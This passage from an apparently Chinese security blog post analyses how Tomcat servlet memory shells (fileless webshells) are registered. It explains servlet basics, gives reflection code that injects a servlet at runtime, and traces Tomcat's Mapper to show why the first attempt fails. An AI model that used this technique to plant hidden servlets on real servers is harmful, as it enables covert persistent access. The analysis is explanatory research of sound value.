class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String method = req.getMethod();</span><br><span class="line">    <span class="keyword">long</span> lastModified;</span><br><span class="line">    <span class="keyword">if</span> (method.equals(<span class="string">"GET"</span>)) &#123;</span><br><span class="line">        lastModified = <span class="keyword">this</span>.getLastModified(req);</span><br><span class="line">        <span class="keyword">if</span> (lastModified == -<span class="number">1L</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.doGet(req, resp);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">long</span> ifModifiedSince;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ifModifiedSince = req.getDateHeader(<span class="string">"If-Modified-Since"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">                ifModifiedSince = -<span class="number">1L</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ifModifiedSince &lt; lastModified / <span class="number">1000L</span> * <span class="number">1000L</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.maybeSetLastModified(resp, lastModified);</span><br><span class="line">                <span class="keyword">this</span>.doGet(req, resp);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                resp.setStatus(<span class="number">304</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"HEAD"</span>)) &#123;</span><br><span class="line">        lastModified = <span class="keyword">this</span>.getLastModified(req);</span><br><span class="line">        <span class="keyword">this</span>.maybeSetLastModified(resp, lastModified);</span><br><span class="line">        <span class="keyword">this</span>.doHead(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"POST"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"PUT"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPut(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"DELETE"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doDelete(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"OPTIONS"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doOptions(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"TRACE"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doTrace(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String errMsg = lStrings.getString(<span class="string">"http.method_not_implemented"</span>);</span><br><span class="line">        Object[] errArgs = <span class="keyword">new</span> Object[]&#123;method&#125;;</span><br><span class="line">        errMsg = MessageFormat.format(errMsg, errArgs);</span><br><span class="line">        resp.sendError(<span class="number">501</span>, errMsg);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>HttpServletRequest和HttpServletResponse</strong></p>
+<p>​        在HTTPServlet.service()中传入了HttpServletRequest和HttpServletResponse对象,通过这两个对象可以获得请求和响应中的信息。</p>
+<p><strong>HttpServletRequest</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getParameter() <span class="comment">//根据参数的内容获取参数值</span></span><br><span class="line">getRequestURI() <span class="comment">//获取请求的URI</span></span><br><span class="line">getQueryString() <span class="comment">//获取get请求中？后的内容</span></span><br><span class="line">getServletPath() <span class="comment">//获取servlet的路径</span></span><br><span class="line">getCookies() <span class="comment">//获取cookie中的信息</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>HttpServletResponse</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addCookie() <span class="comment">//添加cookie</span></span><br><span class="line">sendRedirect() <span class="comment">//设置重定向</span></span><br><span class="line">getWriter() <span class="comment">// 返回 PrintWriter 对象. 调用该对象的 print() 方法, 将把 print() 中的参数直接打印到客户的浏览器上.</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="如何使用servlet？"><a href="#如何使用servlet？" class="headerlink" title="如何使用servlet？"></a>如何使用servlet？</h3><p>​        servlet的创建和filter的创建类似，也有两种形式：</p>
+<ul>
+<li>web.xml中配置声明</li>
+<li>@WebServlet注解声明</li>
+</ul>
+<h4 id="web-xml配置servlet"><a href="#web-xml配置servlet" class="headerlink" title="web.xml配置servlet"></a>web.xml配置servlet</h4><p>​        web.xml配置如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt; //servlet 的名字</span><br><span class="line">    &lt;servlet-<span class="class"><span class="keyword">class</span>&gt;<span class="title">HelloWorld</span>&lt;/<span class="title">servlet</span>-<span class="title">class</span>&gt;  //<span class="title">servlet</span>类的全类名</span></span><br><span class="line"><span class="class">&lt;/<span class="title">servlet</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">servlet</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">servlet</span>-<span class="title">name</span>&gt;<span class="title">HelloWorld</span>&lt;/<span class="title">servlet</span>-<span class="title">name</span>&gt;   //<span class="title">servlet</span> 的名字</span></span><br><span class="line"><span class="class">    &lt;<span class="title">url</span>-<span class="title">pattern</span>&gt;/<span class="title">HelloWorld</span>&lt;/<span class="title">url</span>-<span class="title">pattern</span>&gt;  //访问<span class="title">servlet</span>的路径</span></span><br><span class="line"><span class="class">&lt;/<span class="title">servlet</span>-<span class="title">mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​        引用一张图来说明容器如何根据请求的url找到处理servlet的类,当我们发起一个请求时，会去判断我们请求的路径是否符合url-pattern匹配的内容，匹配成功会找到对应的servlet-name来处理，再根据servlet-name找到servlet-class来处理。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231135749685.png" alt="image-20201231135749685"></p>
+<p>​        实际上同一个servlet类可以对应多个servlet-mapping</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt;   //servlet 的名字</span><br><span class="line">    &lt;url-pattern&gt;/test666&lt;/url-pattern&gt;  //访问servlet的路径</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt;   //servlet 的名字</span><br><span class="line">    &lt;url-pattern&gt;/HelloWorld&lt;/url-pattern&gt;  //访问servlet的路径</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​        接下来我们要编写HelloWorld,我们实现的Servlet类需要继承HttpServlet，并重写几个方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        PrintWriter out = resp.getWriter();</span><br><span class="line">        out.println(<span class="string">"hello world"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"servlet has been destory!!!"</span>);</span><br><span class="line">        <span class="keyword">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        由于定义了两个servlet-mapping，因此可以通过不同的路径来请求同一个servlet。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231143118256.png" alt="image-20201231143118256"></p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231142000181.png" alt="image-20201231142000181"></p>
+<h4 id="WebServlet注解配置servlet"><a href="#WebServlet注解配置servlet" class="headerlink" title="WebServlet注解配置servlet"></a>WebServlet注解配置servlet</h4><p>​        通过注解同样可以完成上述的servlet的配置。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"HelloWorld"</span>,urlPatterns = &#123;<span class="string">"/HelloWorld"</span>,<span class="string">"/test666"</span>&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        PrintWriter out = resp.getWriter();</span><br><span class="line">        out.println(<span class="string">"hello world"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"servlet has been destory!!!"</span>);</span><br><span class="line">        <span class="keyword">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231144016548.png" alt="image-20201231144016548"></p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231144029960.png" alt="image-20201231144029960"></p>
+<h2 id="动态注册servlet"><a href="#动态注册servlet" class="headerlink" title="动态注册servlet"></a>动态注册servlet</h2><h3 id="失败尝试"><a href="#失败尝试" class="headerlink" title="失败尝试"></a>失败尝试</h3><p>​        之前了解过动态注入Filter的技术，以为实现动态注册servlet的方法应该类似，因此使用下面的代码来实现。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");</span><br><span class="line">                    stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    Wrapper wrapper = (Wrapper) standardContext.findChild(<span class="string">"test"</span>); <span class="comment">//查看自定义的servlet是否添加成功</span></span><br><span class="line">                    <span class="keyword">if</span>(wrapper ==<span class="keyword">null</span>) &#123;</span><br><span class="line">                        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP); <span class="comment">//设置state的值，否则执行addservlet方法会报错</span></span><br><span class="line">                        TomcatServlet tomcatServlet=<span class="keyword">new</span> TomcatServlet(); <span class="comment">//创建tomcatservlet实例</span></span><br><span class="line">                        ServletRegistration.Dynamic reg = servletContext.addServlet(<span class="string">"test"</span>, tomcatServlet);   <span class="comment">//添加servlet</span></span><br><span class="line">                        reg.setInitParameter(<span class="string">"encoding"</span>, <span class="string">"utf-8"</span>);</span><br><span class="line">                        reg.setAsyncSupported(<span class="keyword">false</span>);</span><br><span class="line">                        reg.addMapping(<span class="string">"/test666"</span>);  <span class="comment">//添加URL地址映射关系</span></span><br><span class="line">                        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED); <span class="comment">//将state的值还原</span></span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        但是使用这种方式动态添加servlet后访问却是404。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231152513184.png" alt="image-20201231152513184"></p>
+<h3 id="问题排查"><a href="#问题排查" class="headerlink" title="问题排查"></a>问题排查</h3><h4 id="mapping未添加成功"><a href="#mapping未添加成功" class="headerlink" title="mapping未添加成功"></a>mapping未添加成功</h4><p>​        一般来讲，我们添加的mapping会被保存到<code>standardContext.servletMappings</code>中，可以查看该字段来查看mapping是否添加成功，这里可以看到自定义的mapping是添加成功了。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231153355218.png" alt="image-20201231153355218"></p>
+<h4 id="servlet未添加成功"><a href="#servlet未添加成功" class="headerlink" title="servlet未添加成功"></a>servlet未添加成功</h4><p>​        跟进org.apache.catalina.core.ApplicationContext#addServlet(java.lang.String, java.lang.String, javax.servlet.Servlet, java.util.Map&lt;java.lang.String,java.lang.String&gt;） ，我抽出一些比较关键的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Wrapper wrapper = (Wrapper) context.findChild(servletName);  <span class="comment">//检测context中是否已经包含了servlet。</span></span><br><span class="line">  <span class="keyword">if</span> (wrapper == <span class="keyword">null</span>) &#123;  <span class="comment">//由于这个servlet是动态添加的，因此wrapper的内容为空</span></span><br><span class="line">            wrapper = context.createWrapper(); <span class="comment">//创建一个wrapper</span></span><br><span class="line">            wrapper.setName(servletName);  <span class="comment">//设置servlet的name</span></span><br><span class="line">            context.addChild(wrapper);  <span class="comment">//将wrapper添加到当前的context中</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (servlet == <span class="keyword">null</span>) &#123;  <span class="comment">//判断servlet是否为空，由于传入了servlet对象，因此会执行else中的内容</span></span><br><span class="line">            wrapper.setServletClass(servletClass);</span><br><span class="line">            Class&lt;?&gt; clazz = Introspection.loadClass(context, servletClass);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                annotation = clazz.getAnnotation(ServletSecurity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            wrapper.setServletClass(servlet.getClass().getName());  <span class="comment">//wrapper中添加servlet</span></span><br><span class="line">            wrapper.setServlet(servlet);  <span class="comment">//设置servlet对象</span></span><br><span class="line">            <span class="keyword">if</span> (context.wasCreatedDynamicServlet(servlet)) &#123;</span><br><span class="line">                annotation = servlet.getClass().getAnnotation(ServletSecurity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        通过上面的代码，将servlet的实例和servletClass等属性添加到context中，servlet添加也没有问题。执行addservlet和addMapping后，可以看到已经将servlet的instance对象、mappings映射、servletClass等内容添加到context中。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231160006153.png" alt="image-20201231160006153"></p>
+<h4 id="tomcat-加载servlet分析"><a href="#tomcat-加载servlet分析" class="headerlink" title="tomcat 加载servlet分析"></a>tomcat 加载servlet分析</h4><p>​        接下来我们就要分析为什么servlet添加成功后还是无法访问,执行servlet的service请求，一定会经过org.apache.catalina.core.ApplicationFilterChain#internalDoFilter的servlet.service()方法,因此可以在这里打断点分析问题，访问自定义的servlet的url，这里对应的servlet类型并不是定义的TomcatServlet，需要向上追钟servlet是在哪里定义的。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231160647998.png" alt="image-20201231160647998"></p>
+<p>​        在ApplicationFilterChain中仅有org.apache.catalina.core.ApplicationFilterChain#setServlet会为servlet赋值，因此可以在setServlet下断点查看。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231161437760.png" alt="image-20201231161437760"></p>
+<p>​        继续向上跟踪调用 org.apache.catalina.core.ApplicationFilterFactory#createFilterChain中传入了servlet。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231161805758.png" alt="image-20201231161805758"></p>
+<p>​        向上跟踪调用org.apache.catalina.core.StandardWrapperValve#invoke,invoke方法中，将wrapper.allocate()的结果赋值给servlet。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231162057960.png" alt="image-20201231162057960"></p>
+<p>​        跟入wrapper.allocate()，这里instance已经是DefaultServlet了，因此不会再去创建实例。所以需要继续向上追踪，查看哪里给wrapper.instance赋值的。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231163240379.png" alt="image-20201231163240379"></p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231163419357.png" alt="image-20201231163419357"></p>
+<p>​        看看wrapper是怎么得到的，通过getContainer()获取当前对象ValveBase的container得到的。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231164001104.png" alt="image-20201231164001104"></p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231164027686.png" alt="image-20201231164027686"></p>
+<p>​            查看上层org.apache.catalina.core.StandardContextValve#invoke调用,container的内容在wrapper中已经赋值好了。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231165925365.png" alt="image-20201231165925365"></p>
+<p>​        而wrapper的内容是通过request获得的，因此要继续向上追踪request是如何获得的。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231170148864.png" alt="image-20201231170148864"></p>
+<p>​        向上跟踪到org.apache.catalina.connector.CoyoteAdapter#service方法中，在service方法中，创建了request对象，经过postParseRequest方法处理后，给servletClass赋值。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231170927517.png" alt="image-20201231170927517"></p>
+<p>​        在postParseRequest方法中，经过<code>connector.getService().getMapper().map(serverName, decodedURI,version, request.getMappingData());</code>处理后servletClass会被赋值。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231171846938.png" alt="image-20201231171846938"></p>
+<p>​        跟进map方法并向下跟踪调用，在org.apache.catalina.mapper.Mapper#find(org.apache.catalina.mapper.Mapper.MapElement<T>[], org.apache.tomcat.util.buf.CharChunk, int, int)中会去比对访问的路径和定义的servlet路径是否相同。这里的map对象中只有我们定义的servlet的路径，并没有动态添加的servlet路径。</T></p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231172858261.png" alt="image-20201231172858261"></p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231172956381.png" alt="image-20201231172956381"></p>
+<p>​        看到上面其实我们已经知道为什么我们动态添加的servlet没有加载了，再看看find方法的上层调用org.apache.catalina.mapper.Mapper#internalMapExactWrapper,由于没有匹配到结果，因此wrapper返回为空，不满足if条件会被直接返回。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231173956853.png" alt="image-20201231173956853"></p>
+<p>​        也就是说<code>contextVersion.exactWrappers</code>匹配失败，<code>contextVersion.exactWrappers</code>中保存的是自定义的servlet的mapper。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231174828367.png" alt="image-20201231174828367"></p>
+<p>​        exactWrappers匹配失败后会去判断<code>contextVersion.extensionWrappers</code>是否匹配。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231175039952.png" alt="image-20201231175039952"></p>
+<p>​        其他的类似，最后处理default servlet设置<code>mappingData.wrapper</code>的值为defaultWrapper，因此访问/test666最终会执行defaultServlet。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231175138329.png" alt="image-20201231175138329"></p>
+<h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><p>​        通过上面的分析，我们只要在contextVersion中添加Mapper即可动态加载内存马。首先看一下<code>contextVersion.exactWrappers</code>是在何时赋值的，经过分析调用，在org.apache.catalina.mapper.Mapper#addWrapper(org.apache.catalina.mapper.Mapper.ContextVersion, java.lang.String, org.apache.catalina.Wrapper, boolean, boolean)中，会根据url的内容不同，给mapper的不同wrappers属性赋值，当所有的都不匹配是，才会给exactWrappers赋值。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addWrapper</span><span class="params">(ContextVersion context, String path,</span></span></span><br><span class="line"><span class="function"><span class="params">           Wrapper wrapper, <span class="keyword">boolean</span> jspWildCard, <span 